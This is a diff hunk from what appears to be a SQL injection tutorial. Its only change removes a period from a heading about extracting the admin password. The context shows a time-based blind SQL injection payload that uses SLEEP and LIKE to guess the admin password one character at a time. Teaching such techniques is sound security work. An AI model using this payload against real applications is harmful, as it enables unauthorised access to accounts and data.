@@ -808,7 +808,7 @@ Same method can be utilized to enumerate columns from `information_schema.column
 
 ![password column time based](../Images/Web%20Application%20Vulnerabilities%20I/SQL%20Injection%20Introduction/password%20column%20time%20based.png)
 
-#### Step 4: Extract the admin password.
+#### Step 4: Extract the admin password
 
 ```
 admin123' UNION SELECT SLEEP(3),2 from users where username='admin' and password like '4%';--
